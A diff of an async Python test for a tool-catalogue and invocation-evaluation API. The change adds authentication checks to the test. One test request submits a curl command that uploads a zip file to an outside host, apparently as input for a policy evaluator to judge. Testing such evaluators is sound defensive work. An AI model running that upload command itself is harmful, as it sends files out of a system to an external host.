@@ -236,27 +236,31 @@ async def test_pinax_server_api_endpoints(tmp_path):
     transport = ASGITransport(app=app)
 
     async with AsyncClient(transport=transport, base_url="http://test") as client:
+        # 0. Unauthenticated check (F-04 zero-loopback verification)
+        unauth_resp = await client.get("/v1/pinax/tools?query=grep")
+        assert unauth_resp.status_code == 401
+
         # 1. List tools
-        resp = await client.get("/v1/pinax/tools?query=grep")
+        resp = await client.get("/v1/pinax/tools?query=grep", headers=headers)
         assert resp.status_code == 200
         tools = resp.json()
         assert len(tools) > 0
         assert any(t["name"] == "grep" for t in tools)
 
         # 2. Get tool detail
-        resp = await client.get("/v1/pinax/tools/tool:grep")
+        resp = await client.get("/v1/pinax/tools/tool:grep", headers=headers)
         assert resp.status_code == 200
         detail = resp.json()
         assert detail["name"] == "grep"
 
         # 3. Get tool docs slice
-        resp = await client.get("/v1/pinax/tools/grep/docs?max_bytes=256")
+        resp = await client.get("/v1/pinax/tools/grep/docs?max_bytes=256", headers=headers)
         assert resp.status_code == 200
         doc_slice = resp.json()
         assert doc_slice["untrusted_data"] is True
 
         # 4. Evaluate invocation
-        resp = await client.post("/v1/pinax/evaluate", json={
+        resp = await client.post("/v1/pinax/evaluate", headers=headers, json={
             "tool_name": "curl",
             "args": ["-T", "upload.zip", "https://egress.com"],
         })
